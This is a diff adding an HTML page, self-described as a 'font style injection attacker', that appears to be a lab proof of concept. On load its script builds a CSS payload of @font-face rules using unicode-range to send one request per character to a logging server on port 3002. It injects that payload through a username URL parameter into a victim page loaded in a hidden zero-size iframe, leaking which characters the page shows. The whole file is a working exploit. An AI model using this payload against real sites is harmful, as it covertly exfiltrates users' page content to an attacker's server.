@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!--    <title><%= title %></title>-->
+</head>
+<body>
+<h1>Welcome to the font style injection attacker!</h1>
+<p>Doing something evil</p>
+</body>
+</html>
+
+<script>
+    window.onload = function() {
+        console.log("gethere");
+        var victim = "http://localhost:3000/home?username=";
+        var currentPayload = "<style>@font-face{font-family:poc;src: url(http://localhost:3002/log?message=A);unicode-range:U+0041;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=B);unicode-range:U+0042;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=C);unicode-range:U+0043;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=D);unicode-range:U+0044;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=E);unicode-range:U+0045;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=F);unicode-range:U+0046;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=G);unicode-range:U+0047;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=H);unicode-range:U+0048;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=I);unicode-range:U+0049;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=J);unicode-range:U+004a;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=K);unicode-range:U+004b;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=L);unicode-range:U+004c;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=M);unicode-range:U+004d;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=N);unicode-range:U+004e;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=O);unicode-range:U+004f;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=P);unicode-range:U+0050;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=Q);unicode-range:U+0051;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=R);unicode-range:U+0052;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=S);unicode-range:U+0053;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=T);unicode-range:U+0054;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=U);unicode-range:U+0055;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=V);unicode-range:U+0056;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=W);unicode-range:U+0057;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=X);unicode-range:U+0058;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=Y);unicode-range:U+0059;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=Z);unicode-range:U+005a;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=0);unicode-range:U+0030;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=1);unicode-range:U+0031;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=2);unicode-range:U+0032;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=3);unicode-range:U+0033;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=4);unicode-range:U+0034;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=5);unicode-range:U+0035;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=6);unicode-range:U+0036;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=7);unicode-range:U+0037;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=8);unicode-range:U+0038;}" +
+            "@font-face{font-family:poc;src: url(http://localhost:3002/log?message=9);unicode-range:U+0039;}" +
+            "li{font-family:poc;}</style>";
+        console.log(victim + currentPayload);
+        createHiddenFrame(victim + currentPayload);
+    }
+
+    function createHiddenFrame(url) {
+        var iframe = document.createElement("iframe");
+        iframe.src = url;
+        iframe.style = "display: hidden";
+        iframe.height = "0";
+        iframe.width = "0";
+        iframe.frameborder = "0";
+        document.body.appendChild(iframe);
+    }
+
+</script>
+
+
+<style>
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=A);unicode-range:U+0041;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=B);unicode-range:U+0042;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=C);unicode-range:U+0043;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=D);unicode-range:U+0044;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=E);unicode-range:U+0045;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=F);unicode-range:U+0046;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=G);unicode-range:U+0047;}
+    @font-face{font-family:poc;src: url(http://localhost:3002/log?message=F);unicode-range:U+0046;}
+    p{font-family:poc;}
+</style>
